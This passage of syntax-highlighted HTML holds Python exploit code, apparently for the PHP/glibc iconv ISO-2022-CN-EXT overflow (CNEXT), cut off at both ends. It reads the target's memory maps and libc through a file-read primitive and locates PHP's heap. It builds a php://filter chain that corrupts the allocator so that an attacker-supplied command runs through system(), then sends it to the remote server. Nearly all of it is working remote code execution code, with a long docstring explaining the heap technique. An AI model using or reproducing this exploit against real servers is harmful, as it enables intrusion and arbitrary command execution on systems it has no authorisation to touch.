punctuation">)</span>        PATTERN <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span>            <span class="token string">r"^([a-f0-9]+)-([a-f0-9]+)\b"</span> <span class="token string">r".*"</span> <span class="token string">r"\s([-rwx]&#123;3&#125;[ps])\s"</span> <span class="token string">r"(.*)"</span>        <span class="token punctuation">)</span>        regions <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> region <span class="token keyword">in</span> table<span class="token punctuation">.</span>split<span class="token punctuation">(</span>maps<span class="token punctuation">,</span> strip<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token keyword">match</span> <span class="token operator">:=</span> PATTERN<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span>region<span class="token punctuation">)</span><span class="token punctuation">:</span>                start <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>                stop <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>                permissions <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>                path <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token string">"/"</span> <span class="token keyword">in</span> path <span class="token keyword">or</span> <span class="token string">"["</span> <span class="token keyword">in</span> path<span class="token punctuation">:</span>                    path <span class="token operator">=</span> path<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    path <span class="token operator">=</span> <span class="token string">""</span>                current <span class="token operator">=</span> Region<span class="token punctuation">(</span>start<span class="token punctuation">,</span> stop<span class="token punctuation">,</span> permissions<span class="token punctuation">,</span> path<span class="token punctuation">)</span>                regions<span class="token punctuation">.</span>append<span class="token punctuation">(</span>current<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>maps<span class="token punctuation">)</span>                failure<span class="token punctuation">(</span><span class="token string">"Unable to parse memory mappings"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Got </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>regions<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string"> memory regions"</span></span><span class="token punctuation">)</span>        <span class="token keyword">return</span> regions    <span class="token keyword">def</span> <span class="token function">get_symbols_and_addresses</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Obtains useful symbols and addresses from the file read primitive."""</span>        regions <span class="token operator">=</span> self<span class="token punctuation">.</span>get_regions<span class="token punctuation">(</span><span class="token punctuation">)</span>        LIBC_FILE <span class="token operator">=</span> <span class="token string">"/dev/shm/cnext-libc"</span>        <span class="token comment"># PHP's heap</span>        self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"heap"</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>heap <span class="token keyword">or</span> self<span class="token punctuation">.</span>find_main_heap<span class="token punctuation">(</span>regions<span class="token punctuation">)</span>        <span class="token comment"># Libc</span>        libc <span class="token operator">=</span> self<span class="token punctuation">.</span>_get_region<span class="token punctuation">(</span>regions<span class="token punctuation">,</span> <span class="token string">"libc-"</span><span class="token punctuation">,</span> <span class="token string">"libc.so"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>download_file<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>path<span class="token punctuation">,</span> LIBC_FILE<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"libc"</span><span class="token punctuation">]</span> <span class="token operator">=</span> ELF<span class="token punctuation">(</span>LIBC_FILE<span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"libc"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>address <span class="token operator">=</span> libc<span class="token punctuation">.</span>start    <span class="token keyword">def</span> <span class="token function">_get_region</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> regions<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">[</span>Region<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">*</span>names<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Region<span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Returns the first region whose name matches one of the given names."""</span>        <span class="token keyword">for</span> region <span class="token keyword">in</span> regions<span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token builtin">any</span><span class="token punctuation">(</span>name <span class="token keyword">in</span> region<span class="token punctuation">.</span>path <span class="token keyword">for</span> name <span class="token keyword">in</span> names<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            failure<span class="token punctuation">(</span><span class="token string">"Unable to locate region"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> region    <span class="token keyword">def</span> <span class="token function">download_file</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> remote_path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> local_path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Downloads `remote_path` to `local_path`"""</span>        data <span class="token operator">=</span> self<span class="token punctuation">.</span>get_file<span class="token punctuation">(</span>remote_path<span class="token punctuation">)</span>        Path<span class="token punctuation">(</span>local_path<span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">find_main_heap</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> regions<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">[</span>Region<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Region<span class="token punctuation">:</span>        <span class="token comment"># Any anonymous RW region with a size superior to the base heap size is a</span>        <span class="token comment"># candidate. The heap is at the bottom of the region.</span>        heaps <span class="token operator">=</span> <span class="token punctuation">[</span>            region<span class="token punctuation">.</span>stop <span class="token operator">-</span> HEAP_SIZE <span class="token operator">+</span> <span class="token number">0x40</span>            <span class="token keyword">for</span> region <span class="token keyword">in</span> <span class="token builtin">reversed</span><span class="token punctuation">(</span>regions<span class="token punctuation">)</span>            <span class="token keyword">if</span> region<span class="token punctuation">.</span>permissions <span class="token operator">==</span> <span class="token string">"rw-p"</span>            <span class="token keyword">and</span> region<span class="token punctuation">.</span>size <span class="token operator">>=</span> HEAP_SIZE            <span class="token keyword">and</span> region<span class="token punctuation">.</span>stop <span class="token operator">&amp;</span> <span class="token punctuation">(</span>HEAP_SIZE<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span>            <span class="token keyword">and</span> region<span class="token punctuation">.</span>path <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"[anon:zend_alloc]"</span><span class="token punctuation">)</span>        <span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> heaps<span class="token punctuation">:</span>            failure<span class="token punctuation">(</span><span class="token string">"Unable to find PHP's main heap in memory"</span><span class="token punctuation">)</span>        first <span class="token operator">=</span> heaps<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>heaps<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">:</span>            heaps <span class="token operator">=</span> <span class="token string">", "</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">,</span> heaps<span class="token punctuation">)</span><span class="token punctuation">)</span>            msg_info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Potential heaps: [i]</span><span class="token interpolation"><span class="token punctuation">&#123;</span>heaps<span class="token punctuation">&#125;</span></span><span class="token string">[/] (using first)"</span></span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            msg_info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Using [i]</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>first<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">[/] as heap"</span></span><span class="token punctuation">)</span>        <span class="token keyword">return</span> first    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>check_vulnerable<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>get_symbols_and_addresses<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">build_exploit_path</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""On each step of the exploit, a filter will process each chunk one after the        other. Processing generally involves making some kind of operation either        on the chunk or in a destination chunk of the same size. Each operation is        applied on every single chunk; you cannot make PHP apply iconv on the first 10        chunks and leave the rest in place. That's where the difficulties come from.        Keep in mind that we know the address of the main heap, and the libraries.        ASLR/PIE do not matter here.        The idea is to use the bug to make the freelist for chunks of size 0x100 point        lower. For instance, we have the following free list:        ... -> 0x7fffAABBCC900 -> 0x7fffAABBCCA00 -> 0x7fffAABBCCB00        By triggering the bug from chunk ..900, we get:        ... -> 0x7fffAABBCCA00 -> 0x7fffAABBCCB48 -> ???        That's step 3.        Now, in order to control the free list, and make it point whereever we want,        we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,        we'd have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.        That's step 2.        Now, if we were to perform step2 an then step3 without anything else, we'd have        a problem: after step2 has been processed, the free list goes bottom-up, like:        0x7fffAABBCCB00 -> 0x7fffAABBCCA00 -> 0x7fffAABBCC900        We need to go the other way around. That's why we have step 1: it just allocates        chunks. When they get freed, they reverse the free list. Now step2 allocates in        reverse order, and therefore after step2, chunks are in the correct order.        Another problem comes up.        To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.        Since step2 creates chunks that contain pointers and pointers are generally not        UTF-8, we cannot afford to have that conversion happen on the chunks of step2.        To avoid this, we put the chunks in step2 at the very end of the chain, and        prefix them with `0\n`. When dechunked (right before the iconv), they will        "disappear" from the chain, preserving them from the character set conversion        and saving us from an unwanted processing error that would stop the processing        chain.        After step3 we have a corrupted freelist with an arbitrary pointer into it. We        don't know the precise layout of the heap, but we know that at the top of the        heap resides a zend_mm_heap structure. We overwrite this structure in two ways.        Its free_slot[] array contains a pointer to each free list. By overwriting it,        we can make PHP allocate chunks whereever we want. In addition, its custom_heap        field contains pointers to hook functions for emalloc, efree, and erealloc        (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and        then overwrite the use_custom_heap flag to make PHP use these function pointers        instead. We can now do our favorite CTF technique and get a call to        system(&lt;chunk>).        We make sure that the "system" command kills the current process to avoid other        system() calls with random chunk data, leading to undefined behaviour.        The pad blocks just "pad" our allocations so that even if the heap of the        process is in a random state, we still get contiguous, in order chunks for our        exploit.        Therefore, the whole process described here CANNOT crash. Everything falls        perfectly in place, and nothing can get in the middle of our allocations.        """</span>        LIBC <span class="token operator">=</span> self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"libc"</span><span class="token punctuation">]</span>        ADDR_EMALLOC <span class="token operator">=</span> LIBC<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__libc_malloc"</span><span class="token punctuation">]</span>        ADDR_EFREE <span class="token operator">=</span> LIBC<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__libc_system"</span><span class="token punctuation">]</span>        ADDR_EREALLOC <span class="token operator">=</span> LIBC<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__libc_realloc"</span><span class="token punctuation">]</span>        ADDR_HEAP <span class="token operator">=</span> self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"heap"</span><span class="token punctuation">]</span>        ADDR_FREE_SLOT <span class="token operator">=</span> ADDR_HEAP <span class="token operator">+</span> <span class="token number">0x20</span>        ADDR_CUSTOM_HEAP <span class="token operator">=</span> ADDR_HEAP <span class="token operator">+</span> <span class="token number">0x0168</span>        ADDR_FAKE_BIN <span class="token operator">=</span> ADDR_FREE_SLOT <span class="token operator">-</span> <span class="token number">0x10</span>        CS <span class="token operator">=</span> <span class="token number">0x100</span>        <span class="token comment"># Pad needs to stay at size 0x100 at every step</span>        pad_size <span class="token operator">=</span> CS <span class="token operator">-</span> <span class="token number">0x18</span>        pad <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> pad_size        pad <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>pad<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pad<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span>        pad <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>pad<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pad<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span>        pad <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>pad<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pad<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span>        pad <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>pad<span class="token punctuation">)</span>        step1_size <span class="token operator">=</span> <span class="token number">1</span>        step1 <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> step1_size        step1 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step1<span class="token punctuation">)</span>        step1 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step1<span class="token punctuation">)</span>        step1 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step1<span class="token punctuation">,</span> CS<span class="token punctuation">)</span>        step1 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step1<span class="token punctuation">)</span>        <span class="token comment"># Since these chunks contain non-UTF-8 chars, we cannot let it get converted to</span>        <span class="token comment"># ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk "crash"</span>        step2_size <span class="token operator">=</span> <span class="token number">0x48</span>        step2 <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>step2_size <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span>        step2 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2<span class="token punctuation">,</span> CS<span class="token punctuation">)</span>        step2 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2<span class="token punctuation">)</span>        step2 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step2<span class="token punctuation">)</span>        step2_write_ptr <span class="token operator">=</span> <span class="token string">b"0\n"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>step2_size<span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ADDR_FAKE_BIN<span class="token punctuation">)</span>        step2_write_ptr <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2_write_ptr<span class="token punctuation">,</span> CS<span class="token punctuation">)</span>        step2_write_ptr <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2_write_ptr<span class="token punctuation">)</span>        step2_write_ptr <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step2_write_ptr<span class="token punctuation">)</span>        step3_size <span class="token operator">=</span> CS        step3 <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> step3_size        <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>step3<span class="token punctuation">)</span> <span class="token operator">==</span> CS        step3 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>        step3 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>        step3 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>        step3 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>        step3_overflow <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>step3_size <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>BUG<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> BUG        <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span> <span class="token operator">==</span> CS        step3_overflow <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>        step3_overflow <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>        step3_overflow <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>        step3_overflow <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>        step4_size <span class="token operator">=</span> CS        step4 <span class="token operator">=</span> <span class="token string">b"=00"</span> <span class="token operator">+</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>step4_size <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>        step4 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>        step4 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>        step4 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>        step4 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>        <span class="token comment"># This chunk will eventually overwrite mm_heap->free_slot</span>        <span class="token comment"># it is actually allocated 0x10 bytes BEFORE it, thus the two filler values</span>        step4_pwn <span class="token operator">=</span> ptr_bucket<span class="token punctuation">(</span>            <span class="token number">0x200000</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token comment"># free_slot</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            ADDR_CUSTOM_HEAP<span class="token punctuation">,</span>  <span class="token comment"># 0x18</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            ADDR_HEAP<span class="token punctuation">,</span>  <span class="token comment"># 0x140</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            size<span class="token operator">=</span>CS<span class="token punctuation">,</span>        <span class="token punctuation">)</span>        step4_custom_heap <span class="token operator">=</span> ptr_bucket<span class="token punctuation">(</span>            ADDR_EMALLOC<span class="token punctuation">,</span> ADDR_EFREE<span class="token punctuation">,</span> ADDR_EREALLOC<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x18</span>        <span class="token punctuation">)</span>        step4_use_custom_heap_size <span class="token operator">=</span> <span class="token number">0x140</span>        COMMAND <span class="token operator">=</span> self<span class="token punctuation">.</span>command        COMMAND <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"kill -9 $PPID; </span><span class="token interpolation"><span class="token punctuation">&#123;</span>COMMAND<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>sleep<span class="token punctuation">:</span>            COMMAND <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"sleep </span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>sleep<span class="token punctuation">&#125;</span></span><span class="token string">; </span><span class="token interpolation"><span class="token punctuation">&#123;</span>COMMAND<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        COMMAND <span class="token operator">=</span> COMMAND<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"\x00"</span>        <span class="token keyword">assert</span> <span class="token punctuation">(</span>            <span class="token builtin">len</span><span class="token punctuation">(</span>COMMAND<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> step4_use_custom_heap_size        <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"Command too big (</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>COMMAND<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">), it must be strictly inferior to </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>step4_use_custom_heap_size<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        COMMAND <span class="token operator">=</span> COMMAND<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>step4_use_custom_heap_size<span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> COMMAND        step4_use_custom_heap <span class="token operator">=</span> qpe<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        pages <span class="token operator">=</span> <span class="token punctuation">(</span>            step4 <span class="token operator">*</span> <span class="token number">3</span>            <span class="token operator">+</span> step4_pwn            <span class="token operator">+</span> step4_custom_heap            <span class="token operator">+</span> step4_use_custom_heap            <span class="token operator">+</span> step3_overflow            <span class="token operator">+</span> pad <span class="token operator">*</span> self<span class="token punctuation">.</span>pad            <span class="token operator">+</span> step1 <span class="token operator">*</span> <span class="token number">3</span>            <span class="token operator">+</span> step2_write_ptr            <span class="token operator">+</span> step2 <span class="token operator">*</span> <span class="token number">2</span>        <span class="token punctuation">)</span>        resource <span class="token operator">=</span> compress<span class="token punctuation">(</span>compress<span class="token punctuation">(</span>pages<span class="token punctuation">)</span><span class="token punctuation">)</span>        resource <span class="token operator">=</span> b64<span class="token punctuation">(</span>resource<span class="token punctuation">)</span>        resource <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>resource<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        filters <span class="token operator">=</span> <span class="token punctuation">[</span>            <span class="token comment"># Create buckets</span>            <span class="token string">"zlib.inflate"</span><span class="token punctuation">,</span>            <span class="token string">"zlib.inflate"</span><span class="token punctuation">,</span>                        <span class="token comment"># Step 0: Setup heap</span>            <span class="token string">"dechunk"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.L1.L1"</span><span class="token punctuation">,</span>                        <span class="token comment"># Step 1: Reverse FL order</span>            <span class="token string">"dechunk"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.L1.L1"</span><span class="token punctuation">,</span>                        <span class="token comment"># Step 2: Put fake pointer and make FL order back to normal</span>            <span class="token string">"dechunk"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.L1.L1"</span><span class="token punctuation">,</span>                        <span class="token comment"># Step 3: Trigger overflow</span>            <span class="token string">"dechunk"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.UTF-8.ISO-2022-CN-EXT"</span><span class="token punctuation">,</span>                        <span class="token comment"># Step 4: Allocate at arbitrary address and change zend_mm_heap</span>            <span class="token string">"convert.quoted-printable-decode"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.L1.L1"</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span>        filters <span class="token operator">=</span> <span class="token string">"|"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>filters<span class="token punctuation">)</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter/read=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>filters<span class="token punctuation">&#125;</span></span><span class="token string">/resource=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>resource<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token keyword">return</span> path    <span class="token decorator annotation punctuation">@inform</span><span class="token punctuation">(</span><span class="token string">"Triggering..."</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        path <span class="token operator">=</span> self<span class="token punctuation">.</span>build_exploit_path<span class="token punctuation">(</span><span class="token punctuation">)</span>        start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>send<span class="token punctuation">(</span>path<span class="token punctuation">)</span>        <span class="token keyword">except</span> <span class="token punctuation">(</span>ConnectionError<span class="token punctuation">,</span> ChunkedEncodingError<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>                msg_print<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>sleep<span class="token punctuation">:</span>            msg_print<span class="token punctuation">(</span><span class="token string">"    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]"</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> start <span class="token operator">+</span> self<span class="token punctuation">.</span>sleep <span class="token operator">&lt;=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            msg_print<span class="token punctuation">(</span><span class="token string">"    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]"</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token comment"># Wrong heap, maybe? If the exploited suggested others, use them!</span>            msg_print<span class="token punctuation">(</span><span class="token string">"    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]"</span><span class="token punctuation">)</span>                msg_print<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">compress</span><span 